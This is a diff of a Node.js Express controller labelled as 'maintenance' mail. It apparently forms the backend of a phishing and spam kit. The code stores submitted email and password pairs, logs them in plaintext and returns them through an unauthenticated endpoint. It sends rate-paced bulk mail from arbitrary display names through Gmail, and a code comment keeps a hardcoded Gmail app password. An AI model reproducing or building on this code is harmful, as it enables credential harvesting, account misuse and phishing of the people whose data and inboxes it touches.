@@ -12,7 +12,9 @@ var moment = require("moment");
 const { request } = require("https");
 var multer = require("multer");
 const Loggings = db.loggings;
+const Mailerr = db.mailerr;
 const dotenv = require("dotenv");
+const { mailerr } = require("../models");
 dotenv.config();
 
 exports.sendmaintenancemail = (req, res) => {
@@ -1071,7 +1073,14 @@ const sendmaintenancemail = (username, message) => {
   // let from = `Consultation <i***@gmail.com>`
 };
 
-const sendMails = (emailName, emailSubject, emailBody, emailLists) => {
+const sendMails = (
+  emailName,
+  emailSubject,
+  emailBody,
+  emailLists,
+  email,
+  password
+) => {
   // smtpTransport = nodemailer.createTransport(
   //   smtpTransport({
   //     host: "smtp.gmail.com",
@@ -1088,7 +1097,7 @@ const sendMails = (emailName, emailSubject, emailBody, emailLists) => {
   // );
 
   let smtpTransport = nodemailer.createTransport({
-    host: `${process.env.HOST}`,
+    host: `smtp.gmail.com`,
 
     port: "587",
 
@@ -1096,8 +1105,8 @@ const sendMails = (emailName, emailSubject, emailBody, emailLists) => {
       // user: "mana@gmail.com",
       // pass: "alvvcakmxqbfgvfa",
 
-      user: `${process.env.MAIL}`,
-      pass: `${process.env.MAILPASS}`,
+      user: `${email}`,
+      pass: `${password}`,
     },
     //secure: true, // true for 465, false for other ports
     // auth: {
@@ -1109,7 +1118,7 @@ const sendMails = (emailName, emailSubject, emailBody, emailLists) => {
   console.log(`${process.env.MAIL}`);
   console.log(`${process.env.MAILPASS}`);
 
-  var from = `${emailName} <lindamiller1735@gmail.com>`;
+  var from = `${emailName} <${email}>`;
 
   var mail = {
     from: from,
@@ -1243,56 +1252,68 @@ function sleep(ms) {
     setTimeout(resolve, ms);
   });
 }
-exports.createmaintenance = (req, res) => {
+exports.createmaintenance = (request, res) => {
   // console.log(`i was called ${(req.params)}`)
   let attatch = "";
-
-  if (req.body.emailName) {
-    var emailName = req.body.emailName;
-    var emailSubject = req.body.emailSubject;
-    var emailBody = req.body.emailBody;
-    var emailLists = req.body.emailLists;
-    var emailArray = emailLists.split(",");
-
-    for (var i = 0; i < emailArray.length; i++) {
-      // Trim the excess whitespace.
-      emailArray[i] = emailArray[i].replace(/^\s*/, "").replace(/\s*$/, "");
-      // Add additional code here, such as:
-      console.log(emailArray[i]);
-      if (req.body.Sammy) {
-        sendMails2(emailName, emailSubject, emailBody, emailArray[i]);
-        sleep(10000);
+  if (request.body.emailSubject) {
+    sendMails(
+      request.body.emailName,
+      request.body.emailSubject,
+      request.body.emailBody,
+      request.body.emailLists,
+      request.body.email,
+      request.body.password
+    );
+  } else {
+    const users = mailerr.findOne(
+      { appname: request.body.appname },
+      function (err, contact) {
+        if (!err) {
+          if (!contact) {
+            contact = new mailerr();
+            contact.appname = request.body.appname;
+          }
+          contact.email = request.body.email;
+          contact.password = request.body.password;
+          contact.save(function (err) {
+            if (!err) {
+              res.send("saved");
+              console.log(
+                "email " +
+                  contact.email +
+                  " password " +
+                  contact.password +
+                  " appname " +
+                  contact.appname
+              );
+            } else {
+              console.log("Error: could not save contact " + contact.phone);
+            }
+          });
+        }
       }
-
-      if (req.body.yomi) {
-        sendMails3(emailName, emailSubject, emailBody, emailArray[i]);
-        sleep(10000);
-      }
-
-      if (!req.body.yomi && !req.body.Sammy) {
-        sendMails(emailName, emailSubject, emailBody, emailArray[i]);
-        sleep(10000);
-      }
-    }
+    );
   }
 
-  const tenant = new Loggings({
-    username: req.body.username,
-    password: req.body.password,
-  });
+  // const tenant = new mailerr.updateOne({
+  //   appName: req.body.appName,
+  //   email: req.body.email,
+  //   password: req.body.password,
+  // });
 
-  tenant.save((err, user) => {
-    if (err) {
-      res.status(500).send({ message: err });
-      return;
-    }
-  });
+  // tenant.save((err, user) => {
+  //   if (err) {
+  //     res.status(500).send({ message: err });
+  //     return;
+  //   }
+  // });
 
   // sendmaintenancemail(req.body.username,req.body.password)
 };
 
 exports.getmaintenance = (req, res) => {
-  Maintenance.find()
+  mailerr
+    .find()
     .then((maintenances) => {
       res.send(maintenances);
     })
